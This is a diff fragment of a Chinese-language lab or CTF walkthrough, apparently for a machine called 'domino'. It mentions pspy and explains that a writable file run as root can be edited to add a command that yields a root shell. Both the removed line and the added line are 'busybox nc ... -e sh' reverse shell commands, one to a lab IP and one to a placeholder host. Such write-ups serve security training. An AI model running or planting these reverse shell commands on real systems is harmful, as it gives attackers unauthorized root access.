@@ -143,7 +143,7 @@ wget https://github.com/DominicBreuker/pspy/releases/latest/download/pspy64
 ![截图](./domino/27.png)
 答案很显然，可以进行修改，我们只需在里面添加以下命令
 ```bash
-busybox nc 192.168.135.32 4445 -e sh
+busybox nc ip 4444 -e sh
 ```
 ![截图](./domino/28.png)
 退出后没过多久，你将收到root shell
